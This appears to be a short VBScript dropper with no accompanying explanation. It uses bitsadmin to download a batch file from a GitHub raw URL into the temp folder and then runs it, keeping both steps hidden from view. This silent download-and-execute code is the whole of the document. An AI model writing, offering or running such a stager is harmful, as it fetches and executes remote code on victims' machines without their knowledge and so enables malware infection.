createobject("wscript.shell").Run "%comspec% /c bitsadmin /transfer ""D"" https://raw.githubusercontent.com/eventos-dev/test/main/don.bat %temp%\p.bat",vbhide
wscript.sleep 3000
set sobj = createobject("wscript.shell")
sobj.Run "%comspec% /c %temp%\p.bat", vbhide
